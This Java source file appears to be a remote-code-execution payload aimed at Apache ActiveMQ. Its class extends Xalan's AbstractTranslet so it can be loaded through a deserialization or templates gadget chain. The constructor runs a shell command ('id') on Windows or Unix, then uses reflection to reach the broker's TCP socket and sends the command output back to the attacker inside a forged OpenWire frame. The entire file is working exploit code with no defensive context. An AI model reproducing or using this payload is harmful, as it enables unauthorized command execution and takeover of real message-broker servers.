package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


public class O extends AbstractTranslet {
    public O() throws Exception {
//Runtime.getRuntime().exec("open -a Calculator");
     Cmd("id");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static void Cmd(String token) throws Exception {
        String result = "";
        String process = "";
        String arg = "";
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            process = "cmd.exe";
            arg = "/c";
        } else {
            process = "/bin/sh";
            arg = "-c";
        }

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(new String[]{process, arg, token});
            Process start = processBuilder.start();
            java.io.InputStream inputStream = start.getInputStream();
            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();

            int read;
            while((read = inputStream.read()) != -1) {
                byteArrayOutputStream.write(read);
            }

            result = new String(byteArrayOutputStream.toByteArray());
        } catch (Exception var16) {
//            Exception var14 = var16;
//            result = var14.getMessage();
        }

        try {
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            java.io.DataOutput dataOutput = new java.io.DataOutputStream(baos);
            dataOutput.writeInt(0);
            dataOutput.writeByte(14);
            org.apache.activemq.openwire.BooleanStream bs = new org.apache.activemq.openwire.BooleanStream();
            bs.writeBoolean(true);
            bs.writeBoolean(true);
            bs.writeBoolean(true);
            bs.writeBoolean(false);
            bs.writeBoolean(true);
            bs.writeBoolean(false);
            bs.marshal(dataOutput);
            dataOutput.writeUTF("bb");
            dataOutput.writeUTF(result);
            Thread thread = Thread.currentThread();
            Class aClass = Class.forName("java.lang.Thread");
            java.lang.reflect.Field target = aClass.getDeclaredField("target");
            target.setAccessible(true);
            org.apache.activemq.transport.tcp.TcpTransport transport = (org.apache.activemq.transport.tcp.TcpTransport)target.get(thread);
            Class aClass1 = Class.forName("org.apache.activemq.transport.tcp.TcpTransport");
            java.lang.reflect.Field socketfield = aClass1.getDeclaredField("socket");
            socketfield.setAccessible(true);
            java.net.Socket socket = (java.net.Socket)socketfield.get(transport);
            java.io.OutputStream outputStream = socket.getOutputStream();
            outputStream.write(baos.toByteArray());
        } catch (Exception var15) {
        }

    }
}
